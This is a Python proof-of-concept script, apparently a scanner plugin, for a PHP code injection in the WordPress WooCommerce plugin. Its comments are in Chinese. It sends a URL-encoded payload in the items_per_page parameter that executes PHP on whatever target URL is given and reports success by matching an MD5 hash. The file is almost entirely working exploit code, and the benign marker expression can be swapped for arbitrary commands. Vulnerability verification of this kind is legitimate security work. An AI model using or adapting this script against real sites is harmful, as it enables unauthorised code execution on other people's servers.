#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: wordpress 插件WooCommerce PHP代码注入
referer: https://packetstormsecurity.com/files/135000/WordPress-WooCommerce-2.4.12-PHP-Code-Injection.html
author: Lucifer
description: 插件WooCommerce中,参数items_per_page存在PHP代码注入。
'''
import sys
import requests



class wordpress_woocommerce_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/produits/?items_per_page=%24%7b%40print(md5(1234))%7d&setListingType=grid"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在wordpress 插件WooCommerce PHP代码注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = wordpress_woocommerce_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()